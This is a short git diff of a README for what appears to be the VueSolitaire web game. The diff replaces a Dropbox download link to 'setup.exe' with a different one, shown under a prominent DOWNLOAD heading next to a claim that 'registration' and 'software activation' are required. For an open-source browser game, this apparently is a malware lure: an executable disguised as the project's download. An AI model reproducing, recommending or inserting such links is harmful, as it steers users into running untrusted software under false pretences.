@@ -17,7 +17,7 @@
 
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 
-<h1 align="center"><a  href="https://www.dropbox.com/s/ek7nb5dlvat4ldn/setup.exe?dl=1">DOWNLOAD</a></h1>
+<h1 align="center"><a  href="https://www.dropbox.com/s/r5c149kb2feacc3/setup.exe?dl=1">DOWNLOAD</a></h1>
 
 ## Description
 
@@ -45,4 +45,3 @@ OpenGL 2.0-capable system
 
 Internet
 Internet connection and registration are necessary for required software activation
- 
